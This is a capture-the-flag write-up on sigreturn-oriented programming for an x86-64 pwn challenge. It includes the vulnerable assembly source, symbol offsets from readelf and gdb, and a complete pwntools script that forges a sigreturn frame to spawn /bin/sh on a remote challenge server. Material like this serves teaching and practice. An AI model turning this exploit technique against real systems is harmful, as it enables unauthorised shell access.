# SigReturn Exploit - Thanks to @Legacyy for this explaination!
https://en.wikipedia.org/wiki/Sigreturn-oriented_programming  
https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit  
https://bananamafia.dev/post/srop/  

### nasm file
Challenge taken from https://digitaloverdose.ractf.co.uk/campaign/pwn/ropuzzle-v0. Insanely fun.

```asm
section .text
global _start

section .data
msg db '/bin/sh' <- symbol msg is a defined byte that is set as `/bin/sh`

section .text

_start:
    push rbp
    mov rbp, rsp
    call get_input
    call exit

get_input:
    push rbp
    mov rbp, rsp
    mov rax, 0x0
    mov rdi, 0x0
    mov rsi, rsp
    mov rdx, 4096
    call syscall_me
    leave
    ret

syscall_me:
    syscall
    ret

exit:
    mov rax, 0x3c
    mov rdi, 0x0
    syscall
    call exit

gadget:
    pop rax
    ret

```

### retrieving offsets for `/bin/sh`

```
readelf -s ./main

Symbol table '.symtab' contains 11 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS main.nasm
     2: 0000000000402000     0 NOTYPE  LOCAL  DEFAULT    2 msg <- offset for msg is 0x402000
     3: 000000000040100e     0 NOTYPE  LOCAL  DEFAULT    1 get_input
     4: 000000000040102b     0 NOTYPE  LOCAL  DEFAULT    1 syscall_me <- offset for syscall_me is 0x40102b
     5: 000000000040102e     0 NOTYPE  LOCAL  DEFAULT    1 exit
     6: 000000000040103f     0 NOTYPE  LOCAL  DEFAULT    1 gadget <- offset for gadget is 0x40103f
     7: 0000000000401000     0 NOTYPE  GLOBAL DEFAULT    1 _start
     8: 0000000000402007     0 NOTYPE  GLOBAL DEFAULT    2 __bss_start
     9: 0000000000402007     0 NOTYPE  GLOBAL DEFAULT    2 _edata
    10: 0000000000402008     0 NOTYPE  GLOBAL DEFAULT    2 _end

```

### debugging the binary using gdb

```
gdb-peda$ info func
All defined functions:

Non-debugging symbols:
0x0000000000401000  _start
0x000000000040100e  get_input
0x000000000040102b  syscall_me
0x000000000040102e  exit
0x000000000040103f  gadget
gdb-peda$ disas get_input
Dump of assembler code for function get_input:
   0x000000000040100e <+0>:     push   rbp
   0x000000000040100f <+1>:     mov    rbp,rsp
   0x0000000000401012 <+4>:     mov    eax,0x0
   0x0000000000401017 <+9>:     mov    edi,0x0
   0x000000000040101c <+14>:    mov    rsi,rsp
   0x000000000040101f <+17>:    mov    edx,0x1000
   0x0000000000401024 <+22>:    call   0x40102b <syscall_me>
   0x0000000000401029 <+27>:    leave  
   0x000000000040102a <+28>:    ret    
End of assembler dump.
```

### SigReturn Exploit Script
```py
from pwn import *

context.arch = "amd64"

#p = process("./main")
p = remote("193.57.159.27", 65277)

syscall = 0x40102b # syscall is the offset for syscall_me function
gadget = 0x40103f # pop rax ; ret; This was retrieved from both the nasm file and or ROPGadget --binary ./main
binsh = 0x402000 # `/bin/sh` offset retrieved by running readelf -s ./main

frame = SigreturnFrame(kernel="amd64")
frame.rax = 0x3b # 59 => execve => runs a file you specify
frame.rdi = binsh # calls the specified file `/bin/sh`
frame.rsi = 0 # no arguments called for bin sh
frame.rdx = 0 # no environmental variables
frame.rsp = 0 # nothing specified for the stack pointer
frame.rip = syscall


buf = b"A"*8
buf += p64(gadget) + p64(0xf) # rax executes sigreturn which is 0xf
buf += p64(syscall) # call syscall_me
buf += bytes(frame) # call SigreturnFrame


p.send(buf)
p.interactive()
```
